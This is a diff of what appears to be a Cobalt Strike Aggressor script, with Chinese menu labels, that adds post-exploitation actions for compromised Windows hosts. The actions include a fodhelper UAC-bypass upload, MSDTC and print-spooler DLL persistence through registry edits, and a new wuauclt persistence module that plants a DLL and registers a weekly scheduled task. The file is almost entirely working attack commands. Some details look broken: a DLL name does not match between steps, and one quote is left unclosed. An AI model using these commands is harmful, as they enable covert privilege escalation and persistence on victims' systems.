@@ -2,7 +2,7 @@ popup beacon_bottom {
     menu "UAC Bypass"{
         item "fodhelper" {
             $bid = $1;
-            $dialog = dialog("CS上线文件", %(UploadPath => "C:\\Windows\\System\\calc.exe", bid => $bid), &upload);
+            $dialog = dialog("CS上线文件", %(UploadPath => "C:\\Windows\\tasks\\dllsrv.exe", bid => $bid), &upload);
             drow_text($dialog, "UploadPath",  "path: ");
             dbutton_action($dialog, "Executing");
             dialog_show($dialog);
@@ -35,35 +35,56 @@ popup beacon_bottom {
             bshell($bid, "sc config msdtc obj= LocalSystem");
             bshell($bid, "sc config msdtc start= auto");
             bshell($bid, "net start msdtc");
-        }
+                        }
         item "Mstdc卸载" {
             $bid = $1;
             bshell($bid, "net stop msdtc");  
             bshell($bid, "del C:\\Windows\\System32\\oci.dll");
-        }
+                         }
         }
         menu "Spool" {
         item "Spool安装" {
             $bid = $1;
             bcd($bid, "C:\\Windows\\System32");
-            bupload($bid, script_resource("/source/persistence/spool.dll"))
-            bshell($bid, "reg add hklm\\system\\currentcontrolset\\control\\print\\monitors\\monitor /v Driver /d spool.dll /t REG_SZ");
+            bupload($bid, script_resource("/source/persistence/print.dll"))
+            bshell($bid, "reg add hklm\\system\\currentcontrolset\\control\\print\\monitors\\monitor /v Driver /d print.dll /t REG_SZ");
 
-        }
+                        }
         item "Spool触发" {
             $bid = $1;
             bshell($bid, "sc start spooler");  
-        }
+                        }
 
         item "Spool卸载" {
             $bid = $1;
             bshell($bid, "sc stop spooler");  
             bshell($bid, "reg delete hklm\\system\\currentcontrolset\\control\\print\\monitors\\monitor\\Driver /f");
-            bshell($bid, "delete C:\\Windows\\System32\\spool.dll")
-        }
+            bshell($bid, "delete C:\\Windows\\System32\\print.dll")
+                        }
         
+        }
+        menu "Wuauclt" {
+        item "wuauclt安装" {
+            $bid = $1;
+            bcd($bid, "C:\\Windows\\System32");
+            bupload($bid, script_resource("/source/persistence/wuauclt.dll"))
+            bshell($bid, 'SchTasks /Create /SC WEEKLY /TN "Test" /TR "wuauclt.exe /UpdateDeploymentProvider C:\Windows\system32\wwwapipref.dll  /RunHandlerComServer" /ST 07:00 /F');
+
+                        }
+        item "wuauclt触发" {
+            $bid = $1;
+            bshell($bid, "wuauclt.exe /UpdateDeploymentProvider C:\\Windows\\system32\\wuauclt.dll  /RunHandlerComServer");  
+                        }
+
+        item "wuauclt卸载" {
+            $bid = $1;
+            bshell($bid, "taskkill /F /im wuauclt.exe")
+            bshell($bid, "del C:\\Windows\\system32\\wuauclt.dll");  
+            bshell($bid, 'SchTasks /delete /F /tn Test);
+                        }
+        
+        }
     }
-    }
-    
+
     
 }
